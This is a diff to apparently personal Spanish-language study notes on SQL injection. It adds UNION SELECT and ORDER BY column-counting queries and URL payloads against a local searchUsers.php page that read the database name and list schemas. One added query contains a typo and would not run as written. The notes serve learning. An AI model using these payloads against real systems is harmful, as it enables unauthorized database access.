@@ -2203,7 +2203,20 @@ select username from users where id = '3' order by 100;#';
 select username from users where id = '3' order by 2;#'; # Nos dice que no son 2
 # Pero hace alusión a los campos que tenemos seleccionados, en esta caso: users
 select username from users where id = '3' order by 1;#'; # Nos muestra la info requerida
-# Minuto 27:59 
+# Si la consulta llamara 2 campos, si podríamos hacer el order by 2
+select username, password from users where id = '3' order by 2;#'
+
+select username from users where id = '3' union select "test";#';
+select username, password from users where id = '3' union select "test";#'; # Nos da error porque son dos columnas en este caso
+select username, password from useres id = '3' union select 1,2;#; # Aqui nos lo hace correctamente
+
+# A traves de la url con el archivo php buscamos un id que imaginamos que no existe
+localhost/searchUsers.php?id=16859753' union select 1-- - # Esto nos devuelve el 1
+localhost/searchUsers.php?id=16859753' union select "Hola"-- - # Esto nos devuelve el hola
+# Con el siguiente comando mostramos la base de datos en uso
+localhost/searchUsers.php?id=16859753' union select database()-- -
+# Aquí nos muestra las bases de datos contenidas, aunque no siempre las muestra todas
+localhost/searchUsers.php?id=16859753' union select schema_name from information_schema.schemata-- -
 
 
 
